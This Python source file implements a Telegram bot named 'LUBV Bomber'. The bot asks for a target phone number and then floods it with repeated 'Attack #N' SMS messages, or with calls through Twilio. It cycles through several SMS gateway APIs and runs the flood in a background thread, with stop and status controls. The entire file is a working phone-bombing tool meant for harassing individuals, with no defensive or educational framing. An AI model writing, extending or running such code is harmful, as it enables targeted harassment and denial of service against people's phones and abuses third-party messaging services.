import os, re, time, threading, requests, random
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters

BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN: raise ValueError("BOT_TOKEN missing")

# ---------- SMS APIs (free + paid) ----------
SMS_APIS = [
    {"name": "textbelt", "url": "https://textbelt.com/text", "data": lambda n,m: {"phone":n, "message":m, "key":"textbelt"}},
    {"name": "textapi", "url": "https://textapi.com/sms", "data": lambda n,m: {"to":n, "text":m, "api_key":"free"}},
    {"name": "smsgate", "url": "https://api.smsgate.com/send", "data": lambda n,m: {"phone":n, "message":m, "key":"demo"}},
    {"name": "freesms", "url": "https://freesms.com/api", "data": lambda n,m: {"to":n, "body":m, "apikey":"guest"}},
    {"name": "bulksms", "url": "https://api.bulksms.com/v1/messages", "data": lambda n,m: {"to":n, "body":m, "token":"trial"}},
]
# Add Twilio if keys provided
if os.getenv("TWILIO_SID"):
    SMS_APIS.append({
        "name": "twilio",
        "url": f"https://api.twilio.com/2010-04-01/Accounts/{os.getenv('TWILIO_SID')}/Messages.json",
        "auth": (os.getenv("TWILIO_SID"), os.getenv("TWILIO_AUTH")),
        "data": lambda n,m: {"To":n, "From":os.getenv("TWILIO_FROM"), "Body":m}
    })

CALL_APIS = []
if os.getenv("TWILIO_SID"):
    CALL_APIS.append({
        "name": "twilio_call",
        "url": f"https://api.twilio.com/2010-04-01/Accounts/{os.getenv('TWILIO_SID')}/Calls.json",
        "auth": (os.getenv("TWILIO_SID"), os.getenv("TWILIO_AUTH")),
        "data": lambda n: {"To":n, "From":os.getenv("TWILIO_FROM"), "Url":"http://demo.twilio.com/docs/voice.xml"}
    })

# ---------- Attack State ----------
user_data = {}  # {user_id: {"target": "", "mode": "", "running": False, "thread": None}}
logs = {}

def send_sms(number, message):
    for api in SMS_APIS:
        try:
            data = api["data"](number, message)
            if "auth" in api:
                resp = requests.post(api["url"], data=data, auth=api["auth"], timeout=5)
            else:
                resp = requests.post(api["url"], data=data, timeout=5)
            if resp.status_code in [200, 201, 202]:
                return True, f"✅ {api['name']}"
        except: continue
    return False, "❌ All failed"

def attack_worker(user_id, target, mode, count=30, delay=2):
    for i in range(count):
        if not user_data.get(user_id, {}).get("running", False):
            logs.setdefault(user_id, []).append("⏹️ Stopped")
            break
        if mode == "sms":
            ok, msg = send_sms(target, f"Attack #{i+1}")
        else:
            ok, msg = False, "Call not configured" if not CALL_APIS else "Call failed"
        logs.setdefault(user_id, []).append(f"{msg} (#{i+1})")
        time.sleep(delay)
    else:
        logs.setdefault(user_id, []).append("🏁 Finished")
    if user_id in user_data:
        user_data[user_id]["running"] = False

# ---------- Handlers ----------
async def start(update, context):
    keyboard = [[InlineKeyboardButton("🚀 Start Bombing", callback_data="start_bomb")]]
    await update.message.reply_text(
        "🔥 *LUBV Bomber*\nClick below to begin. I'll ask for the number and mode.",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

async def button(update, context):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    if data == "start_bomb":
        user_data[user_id] = {"target": "", "mode": "", "running": False, "thread": None}
        await query.edit_message_text("📞 Send me the **target phone number** (with country code, e.g., +919401950645)")

    elif data == "mode_sms":
        if user_id not in user_data or not user_data[user_id].get("target"):
            await query.edit_message_text("❌ Please send a number first.")
            return
        user_data[user_id]["mode"] = "sms"
        await query.edit_message_text("📱 Mode set to SMS. Starting attack...")
        await start_attack(user_id, query)

    elif data == "mode_call":
        if not CALL_APIS:
            await query.edit_message_text("❌ Call not available – add Twilio keys.")
            return
        if user_id not in user_data or not user_data[user_id].get("target"):
            await query.edit_message_text("❌ Please send a number first.")
            return
        user_data[user_id]["mode"] = "call"
        await query.edit_message_text("📞 Mode set to Call. Starting attack...")
        await start_attack(user_id, query)

    elif data == "stop":
        if user_id in user_data:
            user_data[user_id]["running"] = False
            await query.edit_message_text("⏹️ Attack stopped.")
        else:
            await query.edit_message_text("No active attack.")

    elif data == "status":
        u = user_data.get(user_id, {})
        log = logs.get(user_id, [])
        text = f"Target: {u.get('target','None')}\nMode: {u.get('mode','None')}\nRunning: {'Yes' if u.get('running') else 'No'}\n"
        text += "Logs:\n" + "\n".join(log[-5:]) if log else "No logs"
        await query.edit_message_text(text)

async def start_attack(user_id, query):
    u = user_data[user_id]
    u["running"] = True
    t = threading.Thread(target=attack_worker, args=(user_id, u["target"], u["mode"], 30, 2))
    t.daemon = True
    t.start()
    u["thread"] = t
    # show stop button
    keyboard = [[InlineKeyboardButton("⏹️ Stop", callback_data="stop")],
                [InlineKeyboardButton("📊 Status", callback_data="status")]]
    await query.edit_message_text(
        f"▶️ Attacking {u['target']} ({u['mode']})",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def handle_number(update, context):
    user_id = update.effective_user.id
    number = update.message.text.strip()
    if not re.match(r'^\+?\d{7,15}$', number):
        await update.message.reply_text("❌ Invalid number. Use +1234567890")
        return
    if user_id not in user_data:
        user_data[user_id] = {"target": "", "mode": "", "running": False, "thread": None}
    user_data[user_id]["target"] = number
    # ask for mode
    keyboard = [
        [InlineKeyboardButton("📱 SMS", callback_data="mode_sms"),
         InlineKeyboardButton("📞 Call", callback_data="mode_call")]
    ]
    await update.message.reply_text(
        f"✅ Target set to `{number}`\nNow choose the attack mode:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_number))
    print("✅ Bot is live – ready to bomb!")
    app.run_polling()

if __name__ == "__main__":
    main()
